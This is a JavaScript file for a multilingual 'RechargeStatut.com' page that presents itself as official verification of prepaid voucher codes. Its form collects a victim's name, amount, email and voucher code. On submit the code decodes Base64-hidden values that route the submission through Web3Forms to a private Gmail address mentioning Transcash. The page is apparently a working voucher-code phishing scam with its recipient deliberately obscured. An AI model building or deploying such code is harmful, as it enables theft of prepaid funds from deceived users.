// ===== CONFIGURATION DES TRADUCTIONS =====
const translations = {
  fr: {
    title: "RechargeStatut.com | Vérification Officielle",
    nav_home: "Accueil",
    form_title: "Vérification ",
    form_nom: "Nom :",
    form_prenom: "Prénom :",
    form_montant: "Montant (€) :",
    form_email: "Votre email :",
    form_code: "Code  :",
    form_toggle_label: "Afficher le code :",
    form_oui: "Oui",
    form_non: "Non",
    form_envoyer: "Authentifier ",
    footer_brand_name: "RechargeStatut",
    footer_brand_text: "Vérification des tickets prépayés.",
    footer_link_verify: "Vérifier",
    footer_link_faq: "FAQ",
    footer_link_contact: "Contact",
    footer_copyright: "© 2026 RechargeStatut.com. Tous droits réservés."
  },
  en: {
    title: "RechargeStatut.com | Official Verification",
    nav_home: "Home",
    form_title: " Verification",
    form_nom: "Last Name:",
    form_prenom: "First Name:",
    form_montant: "Amount (€):",
    form_email: "Your Email:",
    form_code: " Code:",
    form_toggle_label: "Show code:",
    form_oui: "Yes",
    form_non: "No",
    form_envoyer: "Authenticate ",
    footer_brand_name: "RechargeStatut",
    footer_brand_text: "Prepaid  verification.",
    footer_link_verify: "Verify",
    footer_link_faq: "FAQ",
    footer_link_contact: "Contact",
    footer_copyright: "© 2026 RechargeStatut.com. All rights reserved."
  },
  es: {
    title: "RechargeStatut.com | Verificación Oficial",
    nav_home: "Inicio",
    form_title: "Verificación",
    form_nom: "Apellido:",
    form_prenom: "Nombre:",
    form_montant: "Monto (€):",
    form_email: "Tu correo electrónico:",
    form_code: "Código del :",
    form_toggle_label: "Mostrar código:",
    form_oui: "Sí",
    form_non: "No",
    form_envoyer: "Autenticar ",
    footer_brand_name: "RechargeStatut",
    footer_brand_text: "Verificación de cupones prepago.",
    footer_link_verify: "Verificar",
    footer_link_faq: "FAQ",
    footer_link_contact: "Contacto",
    footer_copyright: "© 2026 RechargeStatut.com. Todos los derechos reservados."
  },
  de: {
    title: "RechargeStatut.com | Offizielle Prüfung",
    nav_home: "Startseite",
    form_title: "Gutscheinprüfung",
    form_nom: "Nachname:",
    form_prenom: "Vorname:",
    form_montant: "Betrag (€):",
    form_email: "Ihre E-Mail:",
    form_code: "Gutscheincode:",
    form_toggle_label: "Code anzeigen:",
    form_oui: "Ja",
    form_non: "Nein",
    form_envoyer: "Gutschein authentifizieren",
    footer_brand_name: "RechargeStatut",
    footer_brand_text: "Prepaid-Gutscheinprüfung.",
    footer_link_verify: "Prüfen",
    footer_link_faq: "FAQ",
    footer_link_contact: "Kontakt",
    footer_copyright: "© 2026 RechargeStatut.com. Alle Rechte vorbehalten."
  },
  it: {
    title: "RechargeStatut.com | Verifica Ufficiale",
    nav_home: "Home",
    form_title: "Verifica ",
    form_nom: "Cognome:",
    form_prenom: "Nome:",
    form_montant: "Importo (€):",
    form_email: "La tua email:",
    form_code: "Codice :",
    form_toggle_label: "Mostra codice:",
    form_oui: "Sì",
    form_non: "No",
    form_envoyer: "Autentica ",
    footer_brand_name: "RechargeStatut",
    footer_brand_text: "Verifica  prepagati.",
    footer_link_verify: "Verifica",
    footer_link_faq: "FAQ",
    footer_link_contact: "Contatto",
    footer_copyright: "© 2026 RechargeStatut.com. Tutti i diritti riservati."
  },
  pt: {
    title: "RechargeStatut.com | Verificação Oficial",
    nav_home: "Início",
    form_title: "Verificação",
    form_nom: "Apelido:",
    form_prenom: "Nome:",
    form_montant: "Valor (€):",
    form_email: "O seu e-mail:",
    form_code: "Código:",
    form_toggle_label: "Mostrar código:",
    form_oui: "Sim",
    form_non: "Não",
    form_envoyer: "Autenticar",
    footer_brand_name: "RechargeStatut",
    footer_brand_text: "Verificação de cartões pré-pagos.",
    footer_link_verify: "Verificar",
    footer_link_faq: "FAQ",
    footer_link_contact: "Contacto",
    footer_copyright: "© 2026 RechargeStatut.com. Todos os direitos reservados."
}
};

// ====== FONCTION DE TRADUCTION ======
function setLang(lang) {
  localStorage.setItem('lang', lang);

  // Met à jour les éléments texte
  document.querySelectorAll('[data-i18n]').forEach(el => {
    const key = el.getAttribute('data-i18n');
    if (translations[lang] && translations[lang][key]) {
      if (key === 'title') {
        document.title = translations[lang][key];
      } else {
        el.textContent = translations[lang][key];
      }
    }
  });

  // Met à jour l'UI du bouton de langue
  updateLangButtonUI(lang);
}

function updateLangButtonUI(lang) {
  const flags = { fr: 'fr', en: 'gb', es: 'es', de: 'de', it: 'it', pt: 'pt' };
const names = { fr: 'Français', en: 'English', es: 'Español', de: 'Deutsch', it: 'Italiano', pt: 'Português' };
  
  const currentFlag = document.getElementById('current-flag');
  const currentName = document.getElementById('current-lang-name');
  
  if (currentFlag && currentName) {
    currentFlag.src = `https://flagcdn.com/w20/${flags[lang]}.png`;
    currentName.textContent = names[lang];
  }
}

// ====== GESTION DU FORMULAIRE ET SÉCURITÉ ======
function toggleCode(show) {
  const codeInput = document.getElementById("code");
  if (codeInput) codeInput.type = show ? "text" : "password";
}

document.addEventListener('DOMContentLoaded', () => {
  // 1. Charger la langue sauvegardée
  const savedLang = localStorage.getItem('lang') || 'fr';
  setLang(savedLang);

  // 2. Gestion du dropdown de langue
  const langButton = document.getElementById('lang-button');
  const langDropdown = document.getElementById('lang-dropdown');

  if (langButton && langDropdown) {
    langButton.addEventListener('click', (e) => {
      e.stopPropagation();
      langDropdown.classList.toggle('hidden');
    });

    document.addEventListener('click', () => {
      langDropdown.classList.add('hidden');
    });
  }

  // 3. Sécurité Web3Forms (Décodage des clés à l'envoi)
  const form = document.getElementById('verification-form');
  if (form) {
  // Vos clés encodées en Base64 (Nouvelle clé 'k' mise à jour)
  const k = "NjNiYzE4ODktZjkwOC00YjY0LWEzNjQtYmM0NDkyNWEyYjhh"; 
  const m = "YXV0aGVudGlmaWNhdGlvbnRyYW5zY2FzaDE3QGdtYWlsLmNvbQ==";

  form.addEventListener('submit', function (e) {
    document.getElementById('wf_key').value = atob(k);
    document.getElementById('wf_email').value = atob(m);
  });
}
  }
});
